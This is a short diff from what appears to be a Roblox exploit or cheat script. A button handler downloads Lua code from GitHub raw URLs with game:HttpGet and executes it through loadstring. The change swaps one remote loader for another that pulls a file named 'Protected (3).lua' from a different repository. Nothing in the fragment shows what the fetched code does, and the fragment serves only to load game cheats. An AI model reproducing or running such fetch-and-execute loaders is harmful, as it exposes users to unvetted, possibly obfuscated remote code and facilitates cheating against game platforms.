@@ -250,7 +250,7 @@ A.MouseButton1Click:Connect(
         wait(1)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/otimos22/otimos.invencivel/main/otimos.invencivel"))()
         wait(0.6)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/otimos22/chat/main/chat"))()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
     end)
 B.Name = "exit"
 B.Parent = v
